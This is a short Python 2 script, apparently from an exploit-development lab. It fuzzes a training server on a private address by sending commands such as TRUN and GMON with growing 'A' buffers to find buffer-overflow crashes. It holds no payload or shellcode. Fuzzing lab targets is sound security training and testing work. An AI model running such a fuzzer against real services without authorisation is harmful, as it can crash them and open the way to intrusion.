#!/usr/bin/python
import socket

buffer = ["A"]
counter = 50

while len(buffer) <= 100:

    buffer.append("A"*counter)

    counter=counter+50



commands=["HELP","STATS .","RTIME .","LTIME .","SRUN .","TRUN .","GMON .","GDOG .","KSTET .","GTER .","HTER .","LTER .","KSTAN ."]


for command in commands:
    for buffstring in buffer:
        print "Fuzzing " +command +":"+str(len(buffstring))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.19.130', 9999))
        s.recv(50)
        s.send(command + buffstring)
        s.close()
